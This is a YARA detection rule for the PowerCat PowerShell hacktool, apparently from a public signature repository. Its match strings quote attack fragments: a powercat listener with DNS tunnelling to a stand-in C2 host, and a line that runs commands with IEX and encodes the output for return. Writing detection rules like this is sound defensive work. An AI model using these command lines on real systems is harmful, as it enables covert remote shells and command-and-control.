
rule SIGNATURE_BASE_HKTL_PS1_Powercat_Mar21 : FILE
{
	meta:
		description = "Detects PowerCat hacktool"
		author = "Florian Roth (Nextron Systems)"
		id = "ae3963e8-2fe9-5bc3-bf72-95f136622832"
		date = "2021-03-02"
		modified = "2023-12-05"
		reference = "https://github.com/besimorhino/powercat"
		source_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_hafnium.yar#L84-L103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
		logic_hash = "cbd5c6f7c5b4ed713482588ee4490a2326fe11cfaacfb3bfc6a6d94130a8bc83"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2"

	strings:
		$x1 = "powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com" ascii fullword
		$x2 = "try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}" ascii fullword
		$s1 = "Returning Encoded Payload..." ascii
		$s2 = "$CommandToExecute =" ascii fullword
		$s3 = "[alias(\"Execute\")][string]$e=\"\"," ascii

	condition:
		uint16(0)==0x7566 and filesize <200KB and 1 of ($x*) or 3 of them
}